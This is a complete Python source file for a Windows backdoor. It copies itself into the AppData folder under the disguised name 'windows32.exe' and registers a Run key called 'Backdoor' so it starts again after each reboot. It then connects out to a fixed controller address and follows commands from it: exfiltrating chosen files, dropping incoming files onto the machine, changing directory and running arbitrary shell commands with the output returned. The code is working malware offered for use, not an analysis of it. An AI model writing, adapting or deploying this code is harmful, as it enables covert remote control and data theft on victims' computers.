import socket
import subprocess
import os
import sys
import shutil


def registry():
    location = os.environ['appdata'] + '\\windows32.exe'
    if not os.path.exists(location):
        shutil.copyfile(sys.executable, location)
        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "'
                        + location + '"', shell=True)


def letGrab(mySocket, path):
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(5000)
        while len(packet) > 0:
            mySocket.send(packet)
            packet = f.read(5000)
        mySocket.send('DONE'.encode())
    else:
        mySocket.send('File not found'.encode())


def letSend(mySocket, path, fileName):
    if os.path.exists(path):
        f = open(path + fileName, 'ab')
        while True:
            bits = mySocket.recv(5000)
            if bits.endswith('DONE'.encode()):
                f.write(bits[:-4])
                f.close()
                break
            if 'File not found'.encode() in bits:
                break
            f.write(bits)


def connect():
    registry()
    mySocket = socket.socket()
    mySocket.connect(("10.0.0.128", 8080))

    while True:
        command = mySocket.recv(5000)

        if 'terminate' in command.decode():
            try:
                mySocket.close()
                break
            except Exception as e:
                informToServer = "[+] Some error occured. " + str(e)
                mySocket.send(informToServer.encode())
                break

        # command format: grab*<File Path>
        # example: grab*C:\Users\John\Desktop\photo.jpeg
        elif 'grab' in command.decode():
            grab, path = command.decode().split("*")
            try:
                letGrab(mySocket, path)
            except Exception as e:
                informToServer = "[+] Some error occured. " + str(e)
                mySocket.send(informToServer.encode())

        # command format: send*<destination path>*<File Name>
        # example: send*C:\Users\John\Desktop\*photo.jpeg
        elif 'send' in command.decode():
            send, path, fileName = command.decode().split("*")
            try:
                letSend(mySocket, path, fileName)
            except Exception as e:
                informToServer = "[+] Some error occured. " + str(e)
                mySocket.send(informToServer.encode())


        # command format: "cd<space><Path name>"
        # split using the space between 'cd' and path name
        # (because, path name also may have spaces, that confuses the script)
        # and explicitly tell the operating system to change the directory
        elif command.decode().strip() == 'cd':
            informToServer = "[+] Current working directory is " + os.getcwd()
            mySocket.send(informToServer.encode())

        elif command.decode().startswith('cd '):
            try:
                code, directory = command.decode().split(" ", 1)
                os.chdir(directory)
                informToServer = "[+] Current working directory is " + os.getcwd()
                mySocket.send(informToServer.encode())
            except Exception as e:
                informToServer = "[+] Some error occured. " + str(e)
                mySocket.send(informToServer.encode())

        else:
            CMD = subprocess.Popen(command.decode(), shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                   stderr=subprocess.PIPE)
            mySocket.send(CMD.stderr.read())
            mySocket.send(CMD.stdout.read())


def main():
    connect()


main()